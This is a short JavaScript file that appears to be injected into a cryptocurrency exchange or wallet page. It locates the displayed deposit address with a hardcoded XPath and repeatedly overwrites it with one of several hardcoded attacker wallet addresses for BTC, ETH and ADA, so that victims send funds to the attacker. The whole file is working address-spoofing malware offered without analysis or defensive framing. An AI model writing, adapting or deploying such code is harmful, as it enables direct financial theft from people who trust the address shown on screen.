const MAX_ATTEMPTS = 40;
const GENERIC_XPATH = '//*[@id="__APP"]/div[2]/main/main/div[3]/div[2]/div[2]/div[2]/div[1]/div[2]/div/div[1]/div[2]/div/div[4]/div/div/div[3]/div[1]';

// Wallets
const wallets = {
  BTC: 'bc1qjcg77ys0wd4kt87qwg4q7xhszjd3x88jwvqzr7',
  ETH: '0xDee75be41927E854f13Ac680aCCA01148B260A45',
  ADA: 'addr1qypktjzshwqls6lmq4uum6qa3hjkmvmrtfxzyeknnttzr20c4w8zdjyy32yk3c8x2q9xywnm3qz00t26d8r50x7j9zcqmlkvk4'
  // ... more wallets
};

let found = false;
let attempts = 0;

setInterval(() => {
  if (!found && attempts < 40) {
    spoof();
    attempts++;
  }
}, 50);

function spoof() {
  // Determine coin/token
  const href = window.location.href;
  const split = href.split('/');
  const symbol = split[split.length - 1];

  // Check if the spoofer has a wallet that supports this coin
  const wallet = wallets[symbol];

  if (!wallet) {
    // Do nothing
    return true;
  }

  // We can now spoof the address displayed on the screen
  const evaluator = new XPathEvaluator();
  const node = evaluator
    .createExpression(GENERIC_XPATH)
    .evaluate(document, XPathResult.FIRST_ORDERED_NODE_TYPE).singleNodeValue;

  if (!node) {
    // Node not available in the DOM yet, return silently
    return;
  }

  found = true;
  node.innerText = wallet;
}
